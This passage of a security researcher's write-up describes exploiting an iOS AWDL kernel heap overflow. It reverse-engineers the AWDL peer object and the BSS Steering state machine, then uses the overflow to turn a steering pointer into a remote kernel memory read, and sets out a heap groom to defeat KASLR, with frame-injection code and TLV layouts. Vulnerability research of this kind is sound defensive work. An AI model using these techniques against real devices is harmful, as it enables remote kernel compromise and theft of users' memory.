#### IO80211AWDLPeer::actionFrameReport

#### ...

#### case 0x14:

#### if (tlv\_cnt\[0x14\] >= 2)

#### goto ERR;

#### tlv\_cnt\[0x14\]++;

#### this->parseAwdlSyncTreeTLV(bytes);

I explored places where a TLV would trigger a peer list traversal. The idea would then be to sandwich a controlled lookup between two SyncTree TLVs, the first to corrupt the list and the second to somehow make that safe. There were some code paths like this, where we could cause a controlled peer to be looked up in the peer list. There were even some places where we could potentially get a different memory corruption primitive from this but they looked even trickier to exploit. And even then you'd not be able to reset the peer list pointer with the second overflow anyway.

# Reset

Thus far none of my ideas for a read panned out; messing with the linked list without a correctly PAC'd vtable pointer just doesn't seem feasible. At this point I'd probably consider looking for a second vulnerability. For example, in Natalie's recent WebRTC exploit she was able to [find a second vulnerability to defeat ASLR](https://projectzero.google/2020/08/exploiting-android-messengers-part-2.html).

There are still some other ideas left open but they seem tricky to get right:

The other major type of object in the kalloc.6144 zone are ipc\_kmsg's for some IOKit methods. These are in-flight mach messages and it might be possible to corrupt them such that we could inject arbitrary mach messages into userspace. This idea seems mostly to create new challenges rather than solve any open ones though.

If we don't target the same zone then we could try a cross-zone attack, but even then we're quite limited by the primitives offered by AWDL. There just aren't that many interesting objects we can allocate and manipulate.

By this point I've invested a lot of time into this project and am not willing to give up. I've also been hearing very faint whispers that I might have accidentally stumbled upon an attack surface which is being actively exploited. Time to try one more thing...

# Getting up to date

Up until this point I'd been doing most of my reversing using the partially symbolized iOS 12 beta 1 kernelcache. I had done a considerable amount of reversing engineering to build up a reasonable idea of all the fields in the IO80211AWDLPeer object which I could corrupt and it wasn't looking promising. But this vulnerability was only going to get patched in iOS 13.3.1.

Can they have added new fields in iOS 13? It seemed unlikely but of course worth a look.

Here's my reverse-engineered structure definition for IO80211AWDLPeer in iOS 13.3/MacOS 10.15.2:

#### struct \_\_attribute\_\_((packed)) \_\_attribute\_\_((aligned(4))) IO80211AWDLPeer {

#### /\\* +0x0000 \*/  void \*vtable;

#### /\\* +0x0008 \*/  uint32\_t ref\_cnt;

#### /\\* +0x000C \*/  uint32\_t bucket;

#### /\\* +0x0010 \*/  void \*peer\_list\_flink;

#### /\\* +0x0018 \*/  void \*peer\_list\_blink;

#### /\\* +0x0020 \*/  struct ether\_addr peer\_mac;

#### /\\* +0x0026 \*/  uint8\_t pad1\[2\];

#### /\\* +0x0028 \*/  struct IO80211AWDLPeerManager \*peer\_manager;

#### /\\* +0x0030 \*/  uint8\_t pad8\[384\];

#### /\\* +0x01B0 \*/  uint16\_t HT\_FLAGS;

#### /\\* +0x01B2 \*/  uint8\_t HT\_features\[26\];

#### /\\* +0x01CC \*/  uint8\_t HT\_caps;

#### /\\* +0x01CD \*/  uint8\_t pad10\[14\];

#### /\\* +0x01DB \*/  uint8\_t VHT\_caps;

#### /\\* +0x01DC \*/  uint8\_t pad9\[732\];

#### /\\* +0x0418 \*/  uint8\_t added\_to\_fw\_cache;

#### /\\* +0x04B9 \*/  uint8\_t is\_on\_correct\_infra\_channel;

#### /\\* +0x04BA \*/  uint8\_t pad0\[6\];

#### /\\* +0x04C0 \*/  uint32\_t nsync\_total\_len;

#### /\\* +0x0404 \*/  uint8\_t nsync\_tlv\_buf\[64\];

#### /\\* +0x0504 \*/  uint32\_t flags\_from\_dp\_tlv;

#### /\\* +0x0508 \*/  uint8\_t pad14\[19\];

#### /\\* +0x051B \*/  uint32\_t n\_sync\_tree\_macs;

#### /\\* +0x0517 \*/  uint8\_t pad20\[126\];

#### /\\* +0x059D \*/  uint8\_t peer\_infra\_channel;

#### /\\* +0x059E \*/  struct ether\_addr peer\_infra\_mac;

#### /\\* +0x05A4 \*/  struct ether\_addr some\_other\_mac;

#### /\\* +0x05AA \*/  uint8\_t country\_code\[3\];

#### /\\* +0x05AD \*/  uint8\_t pad5\[41\];

#### /\\* +0x05D6 \*/  uint16\_t social\_channels;

#### /\\* +0x0508 \*/  uint64\_t last\_AF\_timestamp;

#### /\\* +0x05E0 \*/  uint8\_t pad17\[116\];

#### /\\* +0x0654 \*/  uint8\_t chanseq\_encoding;

#### /\\* +0x0655 \*/  uint8\_t chanseq\_count;

#### /\\* +0x0656 \*/  uint8\_t chanseq\_step\_count;

#### /\\* +0x0657 \*/  uint8\_t chanseq\_dup\_count;

#### /\\* +0x0658 \*/  uint8\_t pad19\[4\];

#### /\\* +0x0650 \*/  uint16\_t chanseq\_fill\_channel;

#### /\\* +0x065E \*/  uint8\_t chanseq\_channels\[32\];

#### /\\* +0x067E \*/  uint8\_t pad2\[64\];

#### /\\* +0x06BE \*/  uint8\_t raw\_chanseq\[64\];

#### /\\* +0x06FE \*/  uint8\_t pad18\[194\];

#### /\\* +0x07C0 \*/  uint64\_t last\_UMI\_update\_timestamp;

#### /\\* +0x0708 \*/  struct IO80211AWDLPeer \*UMI\_chain\_flink;

#### /\\* +0x07D0 \*/  uint8\_t pad16\[8\];

#### /\\* +0x07D8 \*/  uint8\_t is\_in\_umichain;

#### /\\* +0x0709 \*/  uint8\_t pad15\[79\];

#### /\\* +0x0828 \*/  uint8\_t datapath\_tlv\_flags\_bit\_5\_dualband;

#### /\\* +0x0829 \*/  uint8\_t pad12\[2\];

#### /\\* +0x082B \*/  uint8\_t SDB\_mode;

#### /\\* +0x082C \*/  uint8\_t pad6\[28\];

#### /\\* +0x0848 \*/  uint8\_t did\_parse\_datapath\_tlv;

#### /\\* +0x0849 \*/  uint8\_t pad7\[1011\];

#### /\\* +0x0C3C \*/  uint32\_t UMI\_feature\_mask;

#### /\\* +0x0C40 \*/  uint8\_t pad22\[2568\];

#### /\\* +0x1648 \*/  struct ether\_addr sync\_tree\_macs\[10\]; // overflowable

#### /\\* +0x1684 \*/  uint8\_t sync\_error\_count;

#### /\\* +0x1685 \*/  uint8\_t had\_chanseq\_tlv;

#### /\\* +0x1686 \*/  uint8\_t pad3\[2\];

#### /\\* +0x1688 \*/  uint64\_t per\_second\_timestamp;

#### /\\* +0x1690 \*/  uint32\_t n\_frames\_in\_last\_second;

#### /\\* +0x1694 \*/  uint8\_t pad21\[4\];

#### /\\* +0x1698 \*/  void \*steering\_msg\_blob;  // NEW FIELD

#### /\\* +0x16A0 \*/  uint32\_t steering\_msg\_blob\_size;  // NEW FIELD

#### }

### The layout of fields in my reverse-engineered version of IO80211AWDLPeer. You can define and edit structures in C-syntax like this using the Local Types window in IDA: right-clicking a type and selecting "Edit..." brings up an interactive edit window; it's very helpful for reversing complex data structures such as this.

There are new fields! In fact, there's a new pointer field and length field right at the end of the IO80211AWDLPeer object. But what is a steering\_msg\_blob? What is BSS Steering?

# BSS Steering

Let's take a look at where the steering\_msg\_blob pointer is used.

It's allocated in IO80211AWDLPeer::populateBssSteeringMsgBlob, via the following call stack:

#### IO80211PeerBssSteeringManager::processPostSyncEvaluation

#### IO80211PeerBssSteeringManager::bssSteeringStateMachine

bssSteeringStateMachine is called from many places, including IO80211AWDLPeer::actionFrameReport when it parses a BSS Steering TLV (type 0x1d), so it looks like we can indeed drive this state machine remotely somehow.

The steering\_msg\_blob pointer is freed in IO80211AWDLPeer::freeResources when the IO80211AWDLPeer object is destroyed:

#### steering\_msg\_blob = this->steering\_msg\_blob;

#### if ( steering\_msg\_blob )

#### {

#### kfree(steering\_msg\_blob, this->steering\_msg\_blob\_size);

This gives us our first new primitive: an arbitrary free. Without needing to reverse any of the BSS Steering code we can quite easily overflow from the sync\_tree\_macs field into the steering\_msg\_blob and steering\_msg\_blog\_size fields, setting them to arbitrary values.

If we then wait for the peer to timeout and be destroyed, when ::freeResources is called it will call kfree with our arbitrary pointer and size.

The steering\_msg\_blob is also used in one more place:

In IO80211AWDLPeerManager::handleUmiTimer the IO80211AWDLPeerManager walks a linked-list of peers (a separate linked-list from that used to store all the peers) and from each of the peers in that list it checks whether that peer and the current device are on the same channel and in an availability window:

#### if ( peer\_manager->current\_channel\_ == peer->chanseq\_channels\[peer\_manager->current\_chanseq\_step\] ) {

#### ...

If the UMI timer has indeed fired when both this device and the peer from the UMI list are on the same channel in an overlapping availability window then the IO80211AWDLPeerManager removes the peer from the UMI list, reads the bss\_steering\_blob from the peer and passes it as the last argument to the peer's::sendUnicastMI method.

This passes that blob to IO80211AWDLPeerManager::buildMasterIndicationTemplate to build an AWDL master indication frame before attempting to transmit it.

Let's look at how buildMasterIndicationTemplate uses the steering\_msg\_blob:

The third argument to buildMasterIndicationTemplate is is\_unicast\_MI which indicates whether this method was called by IO80211AWDLPeerManager::sendUnicastMI (which sets it to 1) or IO80211AWDLPeerManager::updatePrimaryPayloadMI (which sets it to 0.)

If buildMasterIndicationTemplate was called to build a unicast MI frame and the peer's feature\_mask field has 0xD'th bit set then the steering\_msg\_blob will be passed to IO80211AWDLPeerManager::buildMultiPeerBssSteeringTlv. This method reads a size from the second dword in the steering\_msg\_blob and checks whether it is smaller than the remaining space in the frame template buffer; if it is, then that size value is used to copy that number of bytes from the steering\_msg\_blob pointer into a TLV (type 0x1d) in the template frame which will then be sent out over the air!

There's clearly a path here to get a semi-arbitrary read; but actually triggering it will require quite a bit more reversing. We need the UMI timer to be firing and we also need to get a peer into the UMI linked list.

# BSS steering state machine

At this point a sensible question to ask is, what exactly is BSS Steering? A bit of googling tells us that it's part of [802.11v](https://support.apple.com/en-us/HT202628); a set of management standards for enterprise networks. One of the advanced features of enterprise networks is the ability to seamlessly move devices between different access points which form part of the same network; for example when you walk around the office with your phone or if there are too many devices associated with one access point. AWDL isn't part of 802.11v. My best guess as to what's happening here is that AWDL is driving the 802.11v AP roaming code to try to move AWDL clients on to a common infrastructure network. I think this code was added to support [Sidecar](https://support.apple.com/en-us/HT210380), but everything below is based only on static reversing.

IO80211PeerBssSteeringManager::bssSteeringStateMachine is responsible for driving the BSS steering state machine. The first argument is a bssSteeringEventenum value representing an event which the state machine should process. Using the IO80211PeerBssSteeringManager::getEventName method we can determine the names for all the events which the state machine will process and using the IO80211PeerBssSteeringManager::getStateName method we can determine the names of the states which the state machine can be in. Again using the local types window in IDA we can define enums for these which will make the HexRays decompiler output much more readable:

#### enum BSSSteeringState

#### {

#### BSS\_STEERING\_STATE\_IDLE = 0x0,

#### BSS\_STEERING\_STATE\_PRE\_STEERING\_SYNC\_EVAL = 0x1,

#### BSS\_STEERING\_STATE\_ASSOCIATION\_ONGOING = 0x2,

#### BSS\_STEERING\_STATE\_TX\_CONFIRM\_AWAIT = 0x3,

#### BSS\_STEERING\_STATE\_STEERING\_SYNC\_CONFIRM\_AWAIT = 0x4,

#### BSS\_STEERING\_STATE\_STEERING\_SYNCED = 0x5,

#### BSS\_STEERING\_STATE\_STEERING\_SYNC\_FAILED = 0x6,

#### BSS\_STEERING\_STATE\_SELF\_STEERING\_ASSOCIATION\_ONGOING = 0x7,

#### BSS\_STEERING\_STATE\_STEERING\_SYNC\_POST\_EVAL = 0x8,

#### BSS\_STEERING\_STATE\_SUSPEND = 0x9,

#### BSS\_STEERING\_INVALID = 0xA,

#### };

#### enum bssSteeringEvent

#### {

#### BSS\_STEERING\_MODE\_ENABLE = 0x0,

#### BSS\_STEERING\_RECEIVED\_DIRECTED\_STEERING\_CMD = 0x1,

#### BSS\_STEERING\_DO\_PRESYNC\_EVAL = 0x2,

#### BSS\_STEERING\_PRESYNC\_EVAL\_DONE = 0x3,

#### BSS\_STEERING\_SELF\_INFRA\_LINK\_CHANGED = 0x4,

#### BSS\_STEERING\_DIRECTED\_STEERING\_CMD\_SENT = 0x5,

#### BSS\_STEERING\_DIRECTED\_STEERING\_TX\_CONFIRM\_RXED = 0x6,

#### BSS\_STEERING\_SYNC\_CONFIRM\_ATTEMPT = 0x7,

#### BSS\_STEERING\_SYNC\_SUCCESS\_EVENT = 0x8,

#### BSS\_STEERING\_SYNC\_FAILED\_EVENT = 0x9,

#### BSS\_STEERING\_OVERALL\_STEERING\_TIMEOUT = 0xA,

#### BSS\_STEERING\_DISABLE\_EVENT = 0xB,

#### BSS\_STEERING\_INFRA\_LINK\_CHANGE\_TIMEOUT = 0xC,

#### BSS\_STEERING\_SELF\_STEERING\_REQUESTED = 0xD,

#### BSS\_STEERING\_SELF\_STEERING\_DONE = 0xE,

#### BSS\_STEERING\_SUSPEND\_EVENT = 0xF,

#### BSS\_STEERING\_RESUME\_EVENT = 0x10,

#### BSS\_STEERING\_REMOTE\_STEERING\_TRIGGER = 0x11,

#### BSS\_STEERING\_PEER\_INFRA\_LINK\_CHANGED = 0x12,

#### BSS\_STEERING\_REMOTE\_STEERING\_FAILED\_EVENT = 0x13,

#### BSS\_STEERING\_INVALID\_EVENT = 0x14,

#### };

The current state is maintained in a steering context object, owned by the IO80211PeerBssSteeringManager. Reverse engineering the state machine code we can come up with the following rough definition for the steering context object:

#### struct \_\_attribute\_\_((packed)) BssSteeringCntx

#### {

#### uint32\_t first\_field;

#### uint32\_t service\_type;

#### uint32\_t peer\_count;

#### uint32\_t role;

#### struct ether\_addr peer\_macs\[8\];

#### struct ether\_addr infraBSSID;

#### uint8\_t pad4\[6\];

#### uint32\_t infra\_channel\_from\_datapath\_tlv;

#### uint8\_t pad8\[8\];

#### char ssid\[32\];

#### uint8\_t pad1\[12\];

#### uint32\_t num\_peers\_added\_to\_umi;

#### uint8\_t pad\_10;

#### uint8\_t pendingTransitionToNewState;

#### uint8\_t pad7\[2\];

#### enum BSSSteeringState current\_state;

#### uint8\_t pad5\[8\];

#### struct IOTimerEventSource \*bssSteeringExpiryTimer;

#### struct IOTimerEventSource \*bssSteeringStageExpiryTimer;

#### uint8\_t pad9\[8\];

#### uint32\_t steering\_policy;

#### uint8\_t inProgress;

#### };

Our goal here is reach IO80211AWDLPeer::populateBssSteeringMsgBlob which is called by IO80211PeerBssSteeringManager::processPostSyncEvaluation which is called when the state machine is in the BSS\_STEERING\_STATE\_STEERING\_SYNC\_POST\_EVAL state and receives the BSS\_STEERING\_PRESYNC\_EVAL\_DONE event.

# Navigating the state machine

Each time a state is evaluated it can change the current state and optionally set the stateMachineTriggeredEvent variable to a new event and set sendEventToNewState to 1. This way the state machine can drive itself forwards to a new state. Let's try to find the path to our target state:

The state machine begins in BSS\_STEERING\_STATE\_IDLE. When we send the BSS steering TLV for the first time this injects either the BSS\_STEERING\_REMOTE\_STEERING\_TRIGGER or BSS\_STEERING\_RECEIVED\_DIRECTED\_STEERING\_CMD event depending on whether the steeringMsgID in the TLV was was 6 or 0.

This causes a call to IO80211PeerBssSteeringManager::processBssSteeringEnabled which parses a steering\_msg structure which itself was parsed from the bss steering tlv; we'll take a look at both of those in a moment. If the steering manager is happy with the contents of the steering\_msg structure from the TLV it starts two [IOTimerEventSources](https://developer.apple.com/documentation/kernel/iotimereventsource): the bssSteeringExpiryTimer and the bssSteeringStageExpiryTimer. The SteeringExpiry timer will abort the entire steering process when it triggers, which happens after a few seconds. The StageExpiry timer allows the state machine to make progress asynchronously. When it expires it will call the IO80211PeerBssSteeringManager::bssSteeringStageExpiryTimerHandler function, a snippet of which is shown here:

#### cntx = this->steering\_cntx;

#### if ( cntx && cntx->pendingTransitionToNewState )

#### {

#### current\_state = cntx->current\_state;

#### switch ( current\_state )

#### {

#### case BSS\_STEERING\_STATE\_PRE\_STEERING\_SYNC\_EVAL:

#### event = BSS\_STEERING\_DO\_PRESYNC\_EVAL;

#### break;

#### case BSS\_STEERING\_STATE\_ASSOCIATION\_ONGOING:

#### case BSS\_STEERING\_STATE\_SELF\_STEERING\_ASSOCIATION\_ONGOING:

#### event = BSS\_STEERING\_INFRA\_LINK\_CHANGE\_TIMEOUT;

#### break;

#### case BSS\_STEERING\_STATE\_STEERING\_SYNC\_CONFIRM\_AWAIT:

#### event = BSS\_STEERING\_SYNC\_CONFIRM\_ATTEMPT;

#### break;

#### default:

#### goto ERR;

#### }

#### result = this->bssSteeringStateMachine(this, event, ...

We can see here the four state transitions which may happen asynchronously in the background when the StageExpiry timer fires and causes events to be injected.

From BSS\_STEERING\_STATE\_IDLE, after the timers are initialized the code sets the pendingTranstionToNewState flag and updates the state to BSS\_STEERING\_STATE\_PRE\_STEERING\_SYNC\_EVAL:

#### this->steering\_cntx->pendingTransitionToNewState = 1;

#### state = BSS\_STEERING\_STATE\_PRE\_STEERING\_SYNC\_EVAL;

We can now see that this will cause the the BSS\_STEERING\_DO\_PRESYNC\_EVAL event to be injected into the steering state machine and we reach the following code:

#### case BSS\_STEERING\_STATE\_PRE\_STEERING\_SYNC\_EVAL:

#### {

#### if ( EVENT == BSS\_STEERING\_DO\_PRESYNC\_EVAL ) {

#### steering\_policy = this->processPreSyncEvaluation(cntx);

#### ...

Here the BSS steering TLV gets parsed and reformatted into a format suitable for the BSS steering code, presumably this is the compatibility layer between the 802.11v enterprise WiFi BSS steering code and AWDL.

We need the IO80211PeerBssSteeringManager::processPreSyncEvaluation to return a steering\_policy value of 7. The code which determines this is very complicated; in the end it turns out that if the target device is currently connected to a 5Ghz network on a non-DFS channel then we can get it to return the right steering policy value to reach BSS\_STEERING\_STATE\_STEERING\_SYNC\_POST\_EVAL. DFS channels are dynamic and can be disabled at runtime if radar is detected. There's no requirement that the attacker is also on the same 5GHz network. There might also be another path to reach the required state but this will do.

At this point we finally reach processPostSyncEvaluation and the steeringMsgBlob will be allocated and the UMI timer armed. When it starts firing the code will attempt to read the steering\_msg\_blob pointer and send the buffer it points to over the air.

# Building the read

Let's look concretely at what's required for the read:

We need two spoofer peers:

#### struct ether\_addr reader\_peer = \*(ether\_aton("22:22:aa:22:00:00"));

#### struct ether\_addr steerer\_peer = \*(ether\_aton("22:22:bb:22:00:00"));

The target device needs to be aware of both these peers so we allocate the reader peer by spoofing a frame from it:

#### inject(RT(),

#### WIFI(dst, reader\_peer),

#### AWDL(),

#### SYNC\_PARAMS(),

#### CHAN\_SEQ\_EMPTY(),

#### HT\_CAPS(),

#### UNICAST\_DATAPATH(0x1307 \| 0x800),

#### PKT\_END());

There are two important things here:

1) This peer will have a channel sequence which is empty; this is crucial as it means we can enforce a gap between the allocation of the steering\_msg\_blob by processPostSyncEvaluation and its use in the UMI timer. Recall that we saw earlier that the unicast MI template only gets built when the UMI timer fires during a peer availability window; if the peer has no availability windows, then the template won't be updated and the steering\_msg\_blob won't be used. We can easily change the channel sequence later by sending a different TLV.

2) The flags in the UNICAST\_DATAPATH TLV. That 0x800 is quite important, without it this happens:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirUJb_s1156_image18%281%29.png)

### This tweet from @mdowd on May 27th 2020 mentioned a double free in BSS reachable via AWDL

We'll get to that...

The next step is to allocate the steerer\_peer and start steering the reader:

#### inject(RT(),

#### WIFI(dst, steerer\_peer),

#### AWDL(),

#### SYNC\_PARAMS(),

#### HT\_CAPS(),

#### UNICAST\_DATAPATH(0x1307),

#### BSS\_STEERING(&reader\_peer, 1),

#### PKT\_END());

Let's look at the bss\_steering TLV:

#### struct bss\_steering\_tlv {

#### uint8\_t type;

#### uint16\_t length;

#### uint32\_t steeringMsgID;

#### uint32\_t steeringMsgLen;

#### uint32\_t peer\_count;

#### struct ether\_addr peer\_macs\[8\];

#### struct ether\_addr BSSID;

#### uint32\_t steeringTimeoutThreshold;

#### uint32\_t SSID\_len;

#### uint8\_t infra\_channel;

#### uint32\_t steeringCmdFlags;

#### char SSID\[32\];

#### } \_\_attribute\_\_((packed));

We need to carefully choose these values; the important part for the exploit however is that we can specify up to 8 peers to be steered at the same time. For this example we'll just steer one peer. Here we build a bss\_steering\_tlv with only one peer\_mac set to the mac address of reader\_peer. If we've set everything up correctly this should cause the IO80211AWDLPeer for the reader\_peer object to allocate a steering\_msg\_blob and start the UMI timer firing trying to send that blob in a UMI

UMI?

UMIs are Unicast Master Indication frames; unlike regular AWDL Master Indication frames UMIs are sent to unicast MAC addresses.

We can now send a final frame:

#### char overflower\[0x80\] = {0};

#### \*(uint64\_t\*)(&overflower\[0x50\]) = 0x4141414141414141;

#### inject(RT(),

#### WIFI(dst, reader\_peer),

#### AWDL(),

#### SYNC\_PARAMS(),

#### SERV\_PARAM(),

#### HT\_CAPS(),

#### DATAPATH(reader\_peer),

#### SYNC\_TREE((struct ether\_addr\*)overflower,

#### sizeof(overflower)/sizeof(struct ether\_addr)),

#### PKT\_END());

There are two important parts to this frame:

1) We've included a SyncTree TLV which will trigger the buffer overflow. SYNC\_TREE will copy the MAC addresses in overflower into the sync\_tree\_macs inline buffer in the IO80211AWDLPeer:

#### /\\* +0x1648 \*/  struct ether\_addr sync\_tree\_macs\[10\];

#### /\\* +0x1684 \*/  uint8\_t sync\_error\_count;

#### /\\* +0x1685 \*/  uint8\_t had\_chanseq\_tlv;

#### /\\* +0x1686 \*/  uint8\_t pad3\[2\];

#### /\\* +0x1688 \*/  uint64\_t per\_second\_timestamp;

#### /\\* +0x1690 \*/  uint32\_t n\_frames\_in\_last\_second;

#### /\\* +0x1694 \*/  uint8\_t pad21\[4\];

#### /\\* +0x1698 \*/  void \*steering\_msg\_blob;

#### /\\* +0x16A0 \*/  uint32\_t steering\_msg\_blob\_size;

sync\_tree\_macs is at offset +0x1648 in the IO80211AWDLPeer object and the steering\_msg\_blob is at +0x1698 so by placing our arbitrary read target 0x50 bytes in to the SYNC\_TREE tlv we'll overwrite the steering\_msg\_blob, in this case with the value 0x4141414141414141.

2) The other important part is that we no longer send the CHAN\_SEQ\_EMPTY TLV, meaning this peer will use the channel sequence in the sync\_params TLV. This contains a channel sequence where the peer declares they are listening in every Availability Window (AW), meaning that the next time the UMI timer fires while the target device is also in an AW it will read the corrupted steering\_msg\_blob pointer and try to build a UMI using it. If we sniff for UMI frames coming from the target MAC address (dst in this example) and parse out TLV 0x1d we'll find our (almost) arbitrarily read memory!

In this case of course trying to read from an address like 0x4141414141414141 will almost certainly cause a kernel panic, so we've still got more work to do.

# Almost-arbitrary read

There are some important limitations for this read technique: firstly, the steering\_msg\_blob has its length as the second dword member and that length will be used as the length of memory to copy into the UMI. This means that we can only read from places where the second dword pointed to is a small value less than around 800 (the available space in the UMI frame.) That size also dictates how much will be read. We can work with this as an initial arbitrary read primitive however.

The second limitation is the speed of these reads; in order to steer multiple peers at the same time and therefore perform multiple reads in parallel we'll need some more tricks. For now, the only option is to wait for steering to fail and restart the steering process. This takes around 8 seconds, after which the steering process can be restarted by using a steeringMsgId value of 0 rather than 6 in in the BSS\_STEERING TLV.

# What to read

At this point we can get memory sent back to us provided it meets some requirements. Helpfully if the memory doesn't meet those requirements as long as the virtual address was mapped and readable the code won't crash so we have some leeway.

My first idea here was to use the physmap, an (almost) 1:1 virtual mapping of the physical address space in virtual memory. The base of the physmap address is randomized on iOS but the slide is smaller than the physical address space size, meaning there's a virtual address in there you can always read from. This gives you a safe virtual address to dereferences to start trying to find pointers to follow.

It was around this point in the development of the exploit that Apple released iOS 13.3.1 which patched the heap overflow. I wanted to also release at least some kind of demo at this point so I [released a very basic proof-of-concept](https://bugs.chromium.org/p/project-zero/issues/detail?id=1982#c2) which drove the BSS Steering state machine far enough to read from the physmap along with a little javascript snippet you could run in Safari to spray physical memory to demonstrate that you really were reading user data. Of course, this isn't all that compelling; the more compelling demo is still a few months down the road.

Discussing these problems with fellow Project Zero researchers Brandon Azad and Jann Horn, Brandon mentioned that on iOS the base of the zone map, used for most general kernel heap allocations, wasn't very randomized at all. I had looked at this using DTrace on MacOS and it seemed fairly randomized, but dumping kernel layout information on iOS isn't quite as trivial as setting a boot argument to disable SIP and enable kernel DTrace.

Brandon had recently finished [the exploit for his oob\_timestamp bug](https://bugs.chromium.org/p/project-zero/issues/detail?id=1986) and as part of that he'd made a spreadsheet showing various values such as the base of the zone and kalloc maps across multiple reboots. And indeed, the randomization of the base of the zone map is very minimal, around 16 MB:

|     |     |     |     |
| --- | --- | --- | --- |
| kASLR | sane\_size | zone\_min | zone\_max |
| 04da4000 | 72fac000 | ffffffe000370000 | ffffffe02b554000 |
| 080a4000 | 73cac000 | ffffffe0007bc000 | ffffffe02be80000 |
| 08b28000 | 73228000 | ffffffe00011c000 | ffffffe02b3ec000 |
| 0bbb0000 | 721a4000 | ffffffe0005bc000 | ffffffe02b25c000 |
| 0c514000 | 7383c000 | ffffffe000650000 | ffffffe02bb68000 |
| 0d4d4000 | 72880000 | ffffffe0002d8000 | ffffffe02b208000 |
| 107d4000 | 7357c000 | ffffffe00057c000 | ffffffe02b98c000 |
| 12c08000 | 73148000 | ffffffe000598000 | ffffffe02b814000 |
| 13fb8000 | 71d98000 | ffffffe000714000 | ffffffe02b230000 |
| 184fc000 | 73854000 | ffffffe00061c000 | ffffffe02bb3c000 |

Using the Service Response Descriptor TLV technique we can allocate 16MB of memory in just a handful of frames, which means we should stand a reasonable chance of being able to safely find our allocations on the heap.

# Finding ourselves

What would we like to read? We've discussed before that in order to safely corrupt the fields after the vtable in the IO80211AWDLPeer object we'll need to know a PAC'ed vtable pointer so we'd like to read one of those. If we're able to find one of those we'll also know the address of at least one IO80211AWDLPeer object.

If you make enough allocations of a particular size in iOS they will tend to go from lower addresses to higher addresses. Apple has introduced various small randomizations into exactly how objects are allocated but they're not relevant if we just examine the overall trend, which is to try to fill the virtual memory area reserved for the zone map from bottom to top.

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHTvm_s624_image4%289%29.png)

### As the maximum slide value of the zone map is smaller than its size there will be a virtual address which is always inside the zone map

The insufficient randomization of the zone map base gives us quite a large virtual memory region I've dubbed the safe probe region where, provided we go approximately from low to high we can safely read.

Our heap groom is as follows:

We send a large number of service\_response TLVs, each of which has the following form:

#### struct service\_response\_16k\_id\_tlv sr = {0};

#### sr.type = 2;

#### sr.len = sizeof(struct service\_response\_16k\_id\_tlv) - 3;

#### sr.s\_1 = 2;

#### sr.key\_buf\[0\] = 'A';

#### sr.key\_buf\[1\] = 'B';

#### sr.v\_1 = 0x4000;

#### sr.v\_2 = 0x1648; // offset

#### sr.val\_buf\[0\] = 6;  // msg\_type

#### sr.val\_buf\[1\] = 0x320; // msg\_id

#### sr.val\_buf\[2\] = 0x41414141; // marker

#### sr.val\_buf\[3\] = val; // value

Each of these TLVs causes the target device to make a 16KB kalloc allocation (one physical page) and then at offset +0x1648 in there write the following 4 dwords:

#### 6

#### 0x320

#### 0x41414141

#### counter

The counter value increments by one for each TLV we send.

We put 39 of these TLVs in every frame which will result in the allocation of 39 physical pages, or over 600kb, for each AWDL frame we send, allowing us to rapidly allocate memory.

We split the groom into three sections, first sending a number of these spray frames, then a number of spoofed peers to cause the allocation of a large number of IO80211AWDLPeer objects. Finally we send another large number of the service response TLVs.

This results in a memory layout approximating this:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgX577_s624_image25.png)

### Inside the safe probe region we aim to place a number of IO80211AWDLPeer objects, surrounded by service\_response groom pages with approximately incrementing counter values

If we now use the BSS Steering arbitrary read primitive to read from near the bottom of the safe probe region at offset +0x1648 from page boundaries, we should hopefully soon find one of the service\_response TLV buffers. Since each service\_response groom contains a unique counter which we can then read, we can make a guess for the distance between this discovered service\_response buffer and the middle of where we think target peers will be and so compute a new guess for the location of a target peer. This approach lets us do something like a binary search to find an IO80211AWDLPeer object reasonably efficiently

Why did I choose to read from offset +0x1648? Because that's also the offset of the sync\_tree\_macs buffer in the IO80211AWDLPeer where we can place arbitrary data. Each of those middle target peers is created like this:

#### struct peer\_fake\_steering\_blob {

#### uint32\_t msg\_id;

#### uint32\_t msg\_len;

#### uint32\_t magic; // 0x43434343 == peer

#### struct ether\_addr mac; // the MAC of this peer

#### uint8\_t pad\[32\];

#### } \_\_attribute\_\_((packed));

#### struct peer\_fake\_steering\_blob fake\_steerer = {0};

#### fake\_steerer.msg\_id = 6;

#### fake\_steerer.msg\_len = 0x320;

#### fake\_steerer.magic = 0x43434343;

#### fake\_steerer.mac = target\_groom\_peer;

#### inject(RT(),

#### WIFI(dst, target\_groom\_peer),

#### AWDL(),

#### SYNC\_PARAMS(),

#### SERV\_PARAM(),

#### HT\_CAPS(),

#### DATAPATH(target\_groom\_peer),

#### SYNC\_TREE((struct ether\_addr\*)&fake\_steerer,

#### sizeof(struct peer\_fake\_steering\_blob)

#### /sizeof(struct ether\_addr)),

#### PKT\_END());

The magic value 0x43434343 lets us determine whether our read has found a service\_response buffer or a peer. Following that we put the spoofed MAC address of this peer. This allows us to determine which peer has the address we guessed. If we do manage to find a peer allocation we can then examine the remaining bytes of disclosed memory; there's a high probability that following this peer is another peer, and we've disclosed the first few dozen bytes of it. Here's a hexdump of a successfully located peer:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXNfh_s624_image13%283%29.png)

### An annotated hexdump of the disclosed memory when two neighbouring IO80211AWDLPeer objects are found. Here you can see the runtime values of the fields in the peer header, including the PAC'ed vtable pointer

We can see here that we have managed to find two peers next to each other. We'll call these lower\_peer and upper\_peer. By placing each sprayed peer's MAC address in the sync\_tree\_macs array we're able to determine both lower\_peer and upper\_peer's MAC address. Since we know which guessed virtual address we chose we also know the virtual addresses of lower\_peer and upper\_peer, and from the PAC'ed vtable pointer we can compute the KASLR slide.

From now on we can easily and repeatedly corrupt the fields seen above by sending a large sync tree TLV containing a modified version of this dumped memory:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4lAX_s624_image19%281%29.png)

### Using the disclosed memory we can safely manipulate the lower fields in upper\_peer using the SyncTree buffer overflow

# A mild panic?

Accidental 0day 1 of 2

During my experiments to get the BSS Steering state machine working and into the desired state where it would send UMIs, I noticed that the target device would sometimes kernel panic, even when I was very sure that I hadn't triggered the heap overflow vulnerability. As it turns out, I was accidentally triggering another zero-day vulnerability...

oops!

